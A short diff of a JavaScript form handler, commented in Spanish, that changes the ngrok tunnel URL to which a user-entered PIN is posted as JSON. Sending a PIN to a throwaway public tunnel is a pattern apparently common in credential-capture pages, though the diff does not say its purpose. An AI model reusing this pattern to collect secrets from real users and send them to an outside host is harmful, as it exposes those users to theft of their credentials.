@@ -20,7 +20,7 @@ document.getElementById("pinForm").addEventListener("submit", async function(e) 
 
   // Enviar PIN al servidor Flask (opcional)
   try {
-    await fetch("https://e5c5-34-14-25-147.ngrok-free.app/pin", {
+    await fetch("https://852f-34-14-25-147.ngrok-free.app/pin", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ pin: pin })
